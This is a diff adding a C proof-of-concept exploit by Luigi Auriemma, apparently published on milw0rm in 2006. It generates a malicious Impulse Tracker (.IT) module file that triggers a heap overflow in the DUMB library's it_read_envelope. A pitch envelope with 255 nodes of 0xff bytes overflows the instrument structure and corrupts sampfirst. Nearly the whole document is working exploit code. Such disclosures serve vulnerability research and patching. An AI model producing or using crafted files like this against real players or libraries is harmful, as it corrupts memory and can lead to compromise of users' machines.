@@ -1,0 +1,323 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+
+
+#define VER         "0.1"
+#define BOF         255     // 25 < BOF < 256
+#define INSTRSZ     371
+#define POCNAME     "proof-of-concept"
+
+
+
+void fwi08(FILE *fd, int num);
+void fwi16(FILE *fd, int num);
+void fwi32(FILE *fd, int num);
+void fwb08(FILE *fd, int num);
+void fwb16(FILE *fd, int num);
+void fwb32(FILE *fd, int num);
+void fwstr(FILE *fd, uint8_t *str);
+void fwstx(FILE *fd, uint8_t *str, int size);
+void fwmem(FILE *fd, uint8_t *data, int size);
+int bits2num(uint8_t *bits);
+void std_err(void);
+
+
+
+#pragma pack(1)
+typedef struct {
+    uint8_t     sign[4];    // IMPM
+    uint8_t     name[26];
+    uint16_t    PHiligt;
+    uint16_t    OrdNum;
+    uint16_t    InsNum;
+    uint16_t    SmpNum;
+    uint16_t    PatNum;
+    uint16_t    Cwtv;
+    uint16_t    Cmwt;
+    uint16_t    Flags;
+    uint16_t    Special;
+    uint8_t     GV;
+    uint8_t     MV;
+    uint8_t     IS;
+    uint8_t     IT;
+    uint8_t     Sep;
+    uint8_t     PWD;
+    uint16_t    MsgLgth;
+    uint32_t    MsgOff;
+    uint32_t    Reserved;
+} it_t;
+
+typedef struct {
+    uint8_t     Flg;
+    uint8_t     Num;
+    uint8_t     LpB;
+    uint8_t     LpE;
+    uint8_t     SLB;
+    uint8_t     SLE;
+//    int8_t      node_y[25];
+//    uint16_t    node_t[25];
+} it_env_t;
+
+typedef struct {
+    uint8_t     sign[4];    // IMPI
+    uint8_t     filename[13];
+    uint8_t     NNA;
+    uint8_t     DCT;
+    uint8_t     DCA;
+    uint16_t    FadeOut;
+    uint8_t     PPS;
+    uint8_t     PPC;
+    uint8_t     GbV;
+    uint8_t     DfP;
+    uint8_t     RV;
+    uint8_t     RP;
+    uint16_t    TrkVers;
+    uint16_t    NoS;
+    uint8_t     insname[26];
+    uint8_t     IFC;
+    uint8_t     IFR;
+    uint8_t     MCh;
+    uint8_t     MPr;
+    uint16_t    MIDIBnk;
+    uint8_t     nsample[120];
+    uint8_t     ktable[120];
+} it_ins_t;
+#pragma pack()
+
+
+
+int main(int argc, char *argv[]) {
+    FILE    *fd;
+    it_t    it;
+    it_ins_t    it_ins;
+    it_env_t    it_env;
+    int     i,
+            off;
+    char    *fname;
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Dumb <= 0.9.3 (CVS 16 Jul 2006) heap overflow in it_read_envelope "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    aluigi.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <output_file.IT>\n"
+            "\n"
+            "Note: this proof-of-concept is not optimized, it gives only an idea of the bug\n"
+            "\n", argv[0]);
+        exit(1);
+    }
+
+    fname = argv[1];
+
+    printf("- create file %s\n", fname);
+    fd = fopen(fname, "wb");
+    if(!fd) std_err();
+
+    memset(&it, 0, sizeof(it));
+    memcpy(it.sign, "IMPM", 4);
+    strncpy(it.name, POCNAME, sizeof(it.name));
+    it.Cmwt   = 0x200;
+    it.OrdNum = 1;                              // required
+    it.InsNum = 1;                              // envelope is read here
+
+    off =
+        sizeof(it) +
+        64 +
+        64 +
+        (it.OrdNum * 1) +
+        (it.InsNum * 4) +
+        (it.SmpNum * 4) +
+        (it.PatNum * 4);
+
+    for(i = 0; i < off; i++) fputc(0, fd);      // create needed space
+
+        /* it_read_instrument */
+
+    memset(&it_ins, 0, sizeof(it_ins));
+    memcpy(it_ins.sign, "IMPI", 4);
+    strncpy(it_ins.filename, POCNAME, sizeof(it_ins.filename));
+    strncpy(it_ins.insname,  POCNAME, sizeof(it_ins.insname));
+
+    fwrite(&it_ins, sizeof(it_ins), 1, fd);
+
+        /* it_read_envelope */
+
+    memset(&it_env, 0, sizeof(it_env));
+
+        /* instrument->volume_envelope */
+
+    it_env.Num = 25;
+    fwrite(&it_env, sizeof(it_env), 1, fd);
+    for(i = 0; i < it_env.Num; i++) {
+        fwi08(fd, 0x61);                        // envelope->node_y[i]
+        fwi16(fd, 0x6161);                      // envelope->node_t[i]
+    }
+    for(i = 75 - (it_env.Num * 3) + 1; i; i--) {
+        fwi08(fd, 0);                           // 75 - envelope->n_nodes * 3 + 1
+    }
+
+        /* instrument->pan_envelope */
+
+    it_env.Num = 25;
+    fwrite(&it_env, sizeof(it_env), 1, fd);
+    for(i = 0; i < it_env.Num; i++) {
+        fwi08(fd, 0x62);                        // envelope->node_y[i]
+        fwi16(fd, 0x6262);                      // envelope->node_t[i]
+    }
+    for(i = 75 - (it_env.Num * 3) + 1; i; i--) {
+        fwi08(fd, 0);                           // 75 - envelope->n_nodes * 3 + 1
+    }
+
+        /* instrument->pitch_envelope */
+
+    it_env.Num = BOF;
+    fwrite(&it_env, sizeof(it_env), 1, fd);
+    for(i = 0; i < it_env.Num; i++) {
+        fwi08(fd, 0xff);                        // envelope->node_y[i]
+        fwi16(fd, 0xffff);                      // envelope->node_t[i]
+    }
+    /* 0xff is used for overwriting sampfirst with a negative value! */
+    /* m = component[n].sampfirst;                                   */
+    /* Note: this PoC is not optimized                               */
+
+    printf(
+        "- the IT_INSTRUMENT structure will be overflowed:\n"
+        "  there are %d bytes from the end of pitch_envelope to the end of map_sample\n"
+        "  while %d bytes will be written by this proof-of-concept\n",
+        INSTRSZ,
+        ((BOF - 25) * sizeof(unsigned short)) + INSTRSZ);
+
+        /* it_load_sigdata */
+
+    fseek(fd, 0, SEEK_SET);
+
+    fwrite(&it, sizeof(it), 1, fd);
+
+    for(i = 0; i < 64; i++) fwi08(fd, 0);       // sigdata->channel_pan
+    for(i = 0; i < 64; i++) fwi08(fd, 0);       // sigdata->channel_volume
+
+    for(i = 0; i < it.OrdNum; i++) {
+        fwi08(fd, 255);                         // sigdata->order
+    }                                           // 255 for found_some = 0 or will SIGFPE
+    for(i = 0; i < it.InsNum; i++) {
+        fwi32(fd, off);                         // component[n_components].offset
+    }
+//    for(i = 0; i < it.SmpNum;  i++) fwi32(fd, off);
+//    for(i = 0; i < it.PatNum;  i++) fwi32(fd, off);
+//    for(i = 0; i < it.MsgLgth; i++) fwi08(fd, 'a');
+
+    fclose(fd);
+    printf("- finished\n");
+    return(0);
+}
+
+
+
+void fwi08(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+}
+
+
+
+void fwi16(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+    fputc((num >>  8) & 0xff, fd);
+}
+
+
+
+void fwi32(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+    fputc((num >>  8) & 0xff, fd);
+    fputc((num >> 16) & 0xff, fd);
+    fputc((num >> 24) & 0xff, fd);
+}
+
+
+
+void fwb08(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+}
+
+
+
+void fwb16(FILE *fd, int num) {
+    fputc((num >>  8) & 0xff, fd);
+    fputc((num      ) & 0xff, fd);
+}
+
+
+
+void fwb32(FILE *fd, int num) {
+    fputc((num >> 24) & 0xff, fd);
+    fputc((num >> 16) & 0xff, fd);
+    fputc((num >>  8) & 0xff, fd);
+    fputc((num      ) & 0xff, fd);
+}
+
+
+
+void fwstr(FILE *fd, uint8_t *str) {
+    fputs(str, fd);
+}
+
+
+
+void fwstx(FILE *fd, uint8_t *str, int size) {
+    int     i;
+
+    for(i = 0; str[i] && (i < size); i++) {
+        fputc(str[i], fd);
+    }
+    for(; i < size; i++) {
+        fputc(0, fd);
+    }
+}
+
+
+
+void fwmem(FILE *fd, uint8_t *data, int size) {
+    fwrite(data, size, 1, fd);
+}
+
+
+
+int bits2num(uint8_t *bits) {
+    int     i,
+            out = 0;
+
+    for(i = 0; i < 32; i++) {
+        if(bits[i] == '1') {
+            out = (out << 1) | 1;
+        } else if(bits[i] == '0') {
+            out <<= 1;
+        } else {
+            break;
+        }
+    }
+    return(out);
+}
+
+
+
+void std_err(void) {
+    perror("\nError");
+    exit(1);
+}
+
+// milw0rm.com [2006-07-19]
